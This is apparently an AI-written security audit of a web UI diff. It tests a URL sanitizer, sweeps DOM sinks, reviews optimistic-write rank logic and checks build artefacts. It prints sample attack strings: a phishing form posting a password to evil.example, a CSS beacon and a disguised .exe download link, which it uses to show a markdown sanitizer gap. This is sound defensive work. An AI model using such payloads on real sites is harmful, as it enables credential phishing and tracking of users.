# Security Audit Report — Phase 2 Web UI, Round 3

- **Scope:** `git diff origin/main...HEAD` in `/workspace`, head `49e55e9`, 69 files, ~12k insertions. Web/TypeScript only.
- **Base diff availability:** resolved correctly. Unlike round 2's auditor I was not reviewing blind.
- **Out of scope:** Go backend / CLI / MCP, except where Go code determines whether a web artefact is exposed or determines the provenance of a string rendered by the client.
- **Not re-run (accepted from the brief):** 362/362 tests, `tsc` clean, `npm audit`. I did independently rebuild, because two of my checks require inspecting the built artefact.

## Summary

| Severity | Count |
|---|---|
| Critical | 0 |
| High     | 0 |
| Medium   | 2 |
| Low      | 4 |
| Info     | 3 |

**Verdict: APPROVE.**

The diff introduces **no new script-execution or attacker-navigation sink**. `safe-url.ts` survived everything I threw at it, and the DEV carve-out is genuinely absent from the production artefact — verified in the minified output, not inferred from the source. The two Mediums are (1) a pre-existing markdown-sanitizer gap that is not in this diff but is the direct answer to "where else do untrusted strings reach the DOM", and (2) a write-path integrity issue in new code where server-controlled availability steers what the client persists.

---

## 1. Re-attacking `safe-url.ts` (brief item 1)

I compiled the real module (`npx tsc src/util/safe-url.ts`) and drove **97 attack strings** through the actual compiled function under plain Node — i.e. the production path, with `LOCAL_HTTP_LINKS_ENABLED === false`, which I asserted at the top of the run rather than assuming.

Classes attacked, beyond round 2's set:

| Class | Examples | Result |
|---|---|---|
| Control-char scheme smuggling | `java\tscript:`, `java\nscript:`, `java\x00script:`, `\x01\x02javascript:` | all rejected |
| Unicode whitespace prefixes | BOM `﻿`, ZWSP `​`, LS ` `, NEL ``, ideographic `　`, NBSP ` ` | all rejected |
| Fullwidth / lookalike schemes | `ｊａｖａｓｃｒｉｐｔ:`, `httpś://` | all rejected |
| Exotic schemes | `blob:`, `filesystem:`, `jar:`, `view-source:`, `intent://`, `android-app://`, `ms-msdt:`, `search-ms:`, `res://`, `about:`, `chrome://`, `ws(s)://`, UNC `\\host\share` | all rejected |
| Protocol-relative / backslash | `//evil`, `///evil`, `/\evil`, `\/evil` | all rejected |
| Userinfo confusion | `https://github.com@evil/`, `:pass@`, `%00@`, `a%2Fb@`, `github.com%40evil` | all rejected |
| Loopback obfuscation on the **production** path | `0x7f000001`, `2130706433`, `127.1`, `0177.0.0.1`, fullwidth `127．0．0．1`, `[::1]`, `[::ffff:127.0.0.1]`, `localhost.` | all rejected |

**Zero bypasses.** Three strings I had pre-labelled "must reject" did return a value; all three are correct behaviour, not weaknesses, and I want to record why so a future round does not re-flag them:

- `https://:@evil.example/` → `https://evil.example/`. Empty username *and* password, so the userinfo guard does not fire — but WHATWG **strips** the empty userinfo from `.href`. The rendered destination is honestly `evil.example`. No confusion.
- `https://github.com\@evil.example/` → `https://github.com/@evil.example/`. For special schemes WHATWG treats `\` as a path separator, so the host really is `github.com` and `@evil.example/` is the path. This is the *safe* direction of the ambiguity.
- `https://😀.com/` → `https://xn--e28h.com/`. An ordinary https URL, punycoded.

Note the guard is deliberately an *allowlist of schemes*, not of hosts: arbitrary `https://` destinations are permitted by design. IDN homographs (`https://gіthub.com/` → `xn--gthub-n2e.com`) are therefore accepted, but they buy an attacker nothing over plain `https://evil.example`, which is already allowed. See [INFO-1] for the one residual nuance.

### The DEV branch really is folded out — verified in the built artefact

The brief asked me not to trust the source. I rebuilt and extracted the minified function from `dist/assets/index-CtCNJYSc.js`:

```js
username||t.password ? null : t.protocol==="https:" ? t.href : null
```

The `http:` branch, the `LOCAL_HTTP_LINKS_ENABLED` reference, and the entire `LOCAL_HOSTNAMES` set are **gone** — constant-folded and then tree-shaken, not merely rendered unreachable. Corroborating greps on the production bundle: `LOCAL_HTTP_LINKS_ENABLED` 0 hits, `127.0.0.1` 0 hits, `localhost` 1 hit (a vendor `grpc-web` XHR feature-probe, `o.open("GET","https://localhost")` — unrelated).

The `typeof import.meta.env !== 'undefined'` guard behaves as documented: under plain Node the module reports `false`, so the Node-side suite pins production behaviour and fails closed. Round 2's LOW-2 is properly closed, including the defect in its own suggested snippet.

**This part of the change is solid. I have no findings against `safe-url.ts`.**

---

## 2. Other paths from untrusted strings to the DOM (brief item 2)

Full sink sweep of `web/src` (not just the diff): `unsafeHTML`/`unsafeSVG`/static-html, `.innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write`, `eval`/`new Function`/string timers, `href`/`src`/`action`/`formaction`/`xlink:href`/`poster`/`srcdoc`, `<iframe>`/`<object>`/`<embed>`/`<base>`, `style` bindings, dynamic event-handler *values*, `window.open`/`location` assignment, synthesized anchor clicks, dynamic `setAttribute` **names**, and SVG `<use>`/`<animate>`.

Result: `.innerHTML`, `eval`, `new Function`, string-argument timers, dynamic tag names, and dynamic attribute names are all **zero hits** across the tree. There are exactly three `href=${…}` bindings and two `unsafeHTML` call sites in the entire app.

### New rendering paths this round — all clean

- **Drop-refusal toasts.** The highest-value new path. `DROP_REFUSAL.crossBandToast(dragged.name, …)` embeds a **task-controlled name** (`ft-ready-queue-view.ts:405`), routed via `write-error` → `ft-app.onWriteError` → `showErrorToast`. All three toast builders in the codebase (`ft-app.ts:868`, `ft-toolbar.ts:837`, `ft-dependency-view.ts:1389`) use `alert.append(icon, document.createTextNode(message))`. `createTextNode`, not `innerHTML` — markup injection is structurally impossible. The same holds for `` `Failed to save changes: ${raw}` `` where `raw` is a **raw server error string**. This is the right pattern and it holds on every path.
- **Availability / hold-reason indicators.** `availabilityLabel()` / `holdReasonLabel()` fall back to `String(reason)` on an unknown server enum, rendered as Lit *text*. Safe.
- **Inspector relationships / dashboard / task cards / toolbar / kanban.** Task data reaches Lit text children or escaped attributes only. `sl-icon name=` bindings (Shoelace fetches and `innerHTML`s the resolved SVG, so it is worth worrying about) are all literal ternaries or `platformIcon()`, an exhaustive switch with a `'globe'` default. No data-derived icon names.
- **`style=` interpolations** (11 of them) are all fed by closed constant maps (`STAGE_COLOR` → `var(--ft-stage-*)` literals) with constant fallbacks. The server controls only the numeric *key*, never the value.
- **Both new `safeExternalUrl` call sites** degrade gracefully rather than merely sanitizing: `ft-inspector-code.ts:112` renders the PR id as an unlinked `<span>`, `ft-inspector-meta.ts:616` omits the row entirely.

### [MEDIUM-1] Markdown sanitizer permits `<form action>` — credential-phishing on a trusted origin

- **Location:** `web/src/util/markdown.ts:5`; sinks at `ft-inspector-desc.ts:233` and `ft-inspector-comments.ts:221`.
- **Scope note, stated plainly:** this file is **NOT in this diff** (untouched since `7a218bd`) and does not block this merge. I am reporting it because the brief asked where *else* untrusted strings reach the DOM, and this is the answer.
- **Description:** `DOMPurify.sanitize(marked.parse(md))` with **default config** — no `addHook`, no `ALLOWED_*`/`FORBID_*` anywhere in the repo. DOMPurify 3.4.12 / marked 15.0.12.
- **Provenance (verified, this is what makes it matter):** `internal/platform/github/github.go:163` maps `issue.GetBody()` straight into `Task.Description`, and the same for comment bodies. This content is authored by **arbitrary third parties**, not just trusted teammates.
- **Verification:** I ran 29 payloads through an exact replica of the pipeline using the project's own jsdom/DOMPurify/marked. **Script execution is solidly blocked — 0 survivors.** `<script>`, `<iframe srcdoc>`, `<base>`, `<meta refresh>`, `<object>`, `<embed>`, `<style>`, `svg <use>`, `<animate>`, the mXSS/mglyph payload, every `on*=` handler, and `javascript:`/`data:` hrefs are all stripped. `target="_blank"` is stripped too, so **no tabnabbing via markdown**.
- **What survives:**
  ```
  in : <form action="https://evil.example"><input name=token type=password><button>Sign in</button></form>
  out: <form action="https://evil.example"><input name="token" type="password"><button>Sign in</button></form>
  ```
  `action` is preserved verbatim; only `target`, `formaction` and `onsubmit` are dropped.
- **Impact:** a GitHub issue body renders a working password field inside the Farm Table inspector. Submitting navigates the top-level page to the attacker origin with the typed value (forms inside a shadow root submit normally). "Your Farm Table session expired, re-enter your token", on a legitimate origin. Because `target` is stripped the navigation *replaces* the app, which makes it more convincing, not less.
- **Recommendation:**
  ```ts
  return DOMPurify.sanitize(marked.parse(md) as string, {
    FORBID_TAGS: ['form', 'input', 'button', 'select', 'textarea', 'option'],
    FORBID_ATTR: ['style', 'formaction', 'action', 'download'],
  });
  ```

### [LOW-1] `style` attribute survives markdown sanitization

Same sink. `<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;background:red">` passes through unmodified (UI redress), as does `style="background:url(https://evil.example/leak)"` (CSS beaconing — leaks viewer IP/UA and read-receipt timing). Closed by the `FORBID_ATTR` above.

### [LOW-2] Remote subresources and `<a download>` survive markdown sanitization

`<img src>`, `<img srcset>`, `<video poster src>` all survive — a tracking pixel telling an attacker exactly who opened a task and when. `<a href="https://evil.example/x" download="invoice.pdf.exe">` also survives: one-click download of an attacker file under an attacker-chosen filename, presented by the trusted app. Remote images are arguably inherent to markdown; `download` is not, and is covered by the `FORBID_ATTR` above.

### [LOW-3] No Content-Security-Policy

`web/index.html` sets no CSP and there is no `frame-ancestors` anywhere in the repo. A policy of `form-action 'self'; img-src 'self' data:` would independently neutralize MEDIUM-1, LOW-1 and LOW-2 as defence in depth. Note `index.html` contains an inline theme-bootstrap `<script>`, so a nonce-less policy would break it — use a hash or nonce.

---

## 3. Optimistic writes and rollback (brief item 3)

Mechanism: `ft-ready-queue-view.ts:384-475` (`reorder()`), `util/rank.ts`, `store/task-store.ts`.

**The rank arithmetic itself is not a weakness and I want to say so clearly.** It is integer-only — `Math.floor((before+after)/2)` with an explicit `candidate > before && candidate < after` exhaustion check, `RANK_STEP = 1024`, `MIN_RANK = 1`, `isUsableRank` rejecting zero/negative/non-finite anchors, and `renumber()` as a real rebalance. There is no float-midpoint precision cliff, and no server-supplied rank value — negative, zero, fractional, `Infinity`, or `> MAX_SAFE_INTEGER` — can cause an invalid rank to be written back. The brief's concern about `(a+b)/2` exhaustion does not apply here.

**The rollback is purely local.** It never issues a write, so it cannot re-persist stale state to the server. That is the most important property and it holds.

Two things are worth acting on.

### [MEDIUM-2] Server-controlled availability decides the rank arithmetic scope

- **Location:** `ft-ready-queue-view.ts:296-306` (`bandFor`), **new in this diff**.
- **Description:** `bandFor` filters band membership with `this.isReady(candidate)`, and `isReady` (`utils/task-ready.ts:11-14`) returns `task.availability.available` **verbatim** when the server supplies it. So a task the server calls unavailable is excluded from the rank scope and the midpoint is computed ignoring its rank.
- **This contradicts the code's own stated invariant.** The doc comment immediately above `bandFor` argues that a filter "decides what is *drawn*, never what the arithmetic is computed over", and the comment at line 417 says "the band is the FULL rank scope, filters ignored". But `isReady` is left inside the predicate, so a **server-controlled filter still decides the arithmetic**. This is the same class of bug that finding F-2 fixed for *view* filters; it was not closed for availability.
- **Non-adversarial reproduction** (this is not only a hostile-server concern): task `H` (rank 1536) becomes blocked by a dependency → server reports unavailable → `H` leaves the band → user drags `C` between `A (1024)` and `B (2048)` → client writes `C = 1536`, colliding with `H` → `H` later unblocks, rejoins the band with a duplicate rank, and the resulting order is resolved by `created_at` rather than by where the user dropped it. Contract §4.6 scopes rank to `(collection, priority band)`; availability is not part of that scope.
- **Recommendation:** drop `this.isReady(candidate)` from `bandFor`, gating only on collection + priority band. One line.

### On the "trust server availability absolutely" ruling (explicitly asked)

I checked every consumer of availability: `ft-task-card.ts:450` lock icon, `ft-inspector-header.ts:208`, `ft-inspector-meta.ts:642`, `ft-dashboard-view.ts:147,219`, the availability filter, and queue membership at `ft-app.ts:684`. All presentational, and **nothing gates a write action on availability**.

For display, the ruling is sound and I would not revisit it. A malicious server already controls `ListTasks`/`WatchTasks`; adding a client-side availability recomputation buys nothing it could not achieve by rewriting `stage`/`holdReason` instead. The bar — "does this let a hostile server do something *more* than it already could" — is not met.

**The one exception is MEDIUM-2, and it is materially different in kind:** there, availability is an input to a *write computation*, not to rendering. That is the only place the ruling widens the attack surface, and the fix is to remove availability from the write path rather than to revisit the ruling. Once `bandFor` is decoupled, "trust the server absolutely" costs nothing. **My recommendation is: keep the ruling, fix `bandFor`.**

### [LOW-4] No concurrency control around the optimistic write; unvalidated response identity

`reorder()` is `async` with no in-flight guard, no generation token, and no per-task lock, and the rollback restores whole `Task` snapshots unconditionally (`:435-442`, `:462`). Consequences, all reproduced by driving the real component:

- **Stale rollback clobbers a newer, already-persisted edit.** Drag `a`→`b` (in flight), then drag `a`→`d` (succeeds), then write #1 fails: rollback restores the drag-1 snapshot. UI shows `a` first; server holds `a` last. Indefinitely — nothing triggers a refetch.
- **Whole-object rollback discards concurrent server state.** A watch event arriving mid-flight (rename, stage change, `version` bump) is silently reverted, including `version` — the exact staleness the adversarial suite at `rank-adversarial.test.ts:166-185` argues matters.
- **No response identity check** (`:447`): `this.store.upsert(updated)` never asserts `updated.id === write.id`, and `grpc-client.ts:281` does not either. A response answering for the wrong task replaces the wrong store entry. Against a *fully hostile* server this is not an escalation (it already controls `ListTasks`). It matters for a buggy or proxy-mangled response, and it is the one real laundering channel: an unacknowledged optimistic rank stays in the store and then anchors the *next* drag's midpoint, which **is** written.
- **Partial renumber can leave duplicate ranks on the server** while the client rolls back locally and shows the pre-drag order — persistent server-side corruption from one interrupted drag, with nothing on screen indicating it.

I am rating this **LOW for security** — it needs either a hostile server (which already has better options) or an unlucky race, and the rollback cannot write to the server. **As a correctness matter it is more serious than LOW**, and I flag that for the manager to route to the code reviewer rather than escalating it myself.

Minimal fix closing most of it — a generation token plus a rank-only merged rollback:

```ts
const token = ++this.reorderToken;
// ...
} catch (error) {
  if (token !== this.reorderToken) return;      // a newer reorder owns the state
  for (const original of originals) {
    const current = this.store.getTask(original.id);
    if (current) this.store.upsert({ ...current, rank: original.rank });
  }
```

and one line at the write site:

```ts
const updated = await this.client.updateTask(write.id, { rank: write.rank });
if (updated.id !== write.id) throw new Error(`UpdateTask answered for ${updated.id}, expected ${write.id}`);
```

**Error handling is good** and worth noting: every refusal and every failure reaches the user via the same `write-error` → toast channel, so no drag fails silently.

---

## 4. Build output (brief item 4)

Rebuilt and audited `dist/` wider than sourcemaps:

- **Sourcemaps: 0.** `vite.config.ts` sets `sourcemap: false` with a correct comment explaining why `'hidden'` would be insufficient (it still writes the `.map` into `dist/`, which is then embedded via `//go:embed all:web/dist` and served without auth). Correct reasoning.
- **No stray artefacts:** zero `.map`, `.env*`, `.pem`, `.key`, `.ts`, `.md`, `.log`, `.bak`, `~`, `.DS_Store` anywhere in `dist/`. Non-vendor output is exactly four files: `index.html`, `favicon.svg`, one CSS, one JS.
- **No embedded secrets.** Grepping the bundle for key/secret/token patterns: `API_KEY` is a protobuf **enum descriptor** (`AUTH_METHOD_API_KEY`), and the single `Bearer` hit is `metadata()` building the header from a runtime token. No hardcoded credential, no `ghp_`/`sk-` material.
- **Token bootstrap is clean in the production artefact.** The minified resolver reads `t.FARMTABLE_TOKEN ?? "" ?? ""` — the double-collapsed `??` chain is the folded remnant of the dev-only `localStorage` and URL-param fallbacks. `URLSearchParams` is present but used **only** for `collection`. So: no `?token=` path and no script-readable bearer token in production. Round 2's claim verified independently.

### [INFO-2] 17 MB of Shoelace assets ship unauthenticated

`dist/` is 18 MB, of which `dist/shoelace/` is 17 MB — **4100 SVG icons** copied wholesale by `viteStaticCopy`, plus `icons.json`. Not a vulnerability: they are public library assets with no app data. But they are embedded in the server binary and served without auth, they dominate binary size, and the app uses a small fraction of them. Consider narrowing the copy glob to the icons actually referenced.

### [INFO-3] Full protobuf descriptor is embedded in the bundle

The bundle carries the complete reflection JSON, including enum vocabularies not used by the UI (e.g. the full `AuthMethod` set). This is inherent to `protobufjs` reflection and the descriptor largely describes the API surface a client can already see, so the disclosure is marginal — but it is the same *class* as round 1's closed "mock change history exposes deleted state vocabulary" finding, and worth knowing about.

---

## Positive observations

- **`safe-url.ts` is genuinely well built.** Userinfo rejection, WHATWG normalization used deliberately rather than incidentally, and a docstring that names the concrete `0x7f000001` / `127.1` / fullwidth bypasses instead of hand-waving. 97 attack strings, zero bypasses.
- **The DEV gate is verifiably dead in production**, at the artefact level, and the `typeof` guard makes the Node-side suite pin the *production* answer — the suite fails closed. That is a better fix than round 2 asked for.
- **Every toast builder uses `createTextNode`.** This keeps the entire client-side error channel — including raw server error strings and task names — structurally immune to markup injection, which is what makes the new drop-refusal path safe by construction rather than by review.
- **Zero `innerHTML` / `eval` / `new Function` / dynamic-`setAttribute`-name usage** across ~60 source files, and only two `unsafeHTML` sites both behind one sanitizer. That is unusual discipline and it is what made this audit tractable.
- Both untrusted-URL call sites **degrade gracefully** rather than merely sanitizing.
- The clientless-queue guard was correctly moved **before** the optimistic write (the F-3 fix), so no unpersistable rank enters the store on that path.
- `rank.ts` cannot be made to emit an invalid rank from any server input I tried.
- `sourcemap: false` with an explicit rejection of `'hidden'` shows the round-2 finding was understood, not just patched.

## Recommendations, in priority order

1. **MEDIUM-2** — remove `this.isReady(candidate)` from `bandFor`. One line; closes a live non-adversarial ordering bug and takes availability out of the write path entirely.
2. **MEDIUM-1** — add `FORBID_TAGS`/`FORBID_ATTR` to `markdown.ts`. One line; closes the Medium and both markdown Lows. Track separately from this merge, since the file is not in this diff.
3. **LOW-3** — add a CSP to `index.html`; `form-action 'self'` alone independently kills MEDIUM-1.
4. **LOW-4** — generation token + rank-only merged rollback + response identity check. Flagging for the code reviewer as a correctness issue above its security rating.
5. **INFO-1** — the two external anchors render *static* link text (`pr.id`, a fixed label), so the user cannot see the destination before clicking, and arbitrary `https://` hosts are permitted by design. Consider showing the hostname in the link title. Also add `noreferrer` to `ft-toolbar.ts:548` for consistency with the other two anchors (it has `noopener`, so this is referrer hygiene, **not** tabnabbing).
6. **INFO-2 / INFO-3** — narrow the Shoelace copy glob; note the descriptor disclosure.
7. Consider an ESLint rule banning `unsafeHTML` outside `util/markdown.ts` to keep the current two-sink invariant from eroding.

---

## Method note

What I actually attacked, so a future round need not repeat it: 97 URL strings through the compiled `safeExternalUrl` on the production path; 29 XSS/phishing payloads through an exact replica of the markdown pipeline using the project's own jsdom/DOMPurify/marked; a full 11-category DOM-sink sweep of `web/src`; extraction and inspection of the minified `safeExternalUrl` and token bootstrap from a fresh production build; and a file-level and secret-pattern audit of `dist/`. Round-2 findings were re-verified rather than assumed closed. No repository files were modified; scratch harnesses were written to `/tmp` and `git status` is clean.
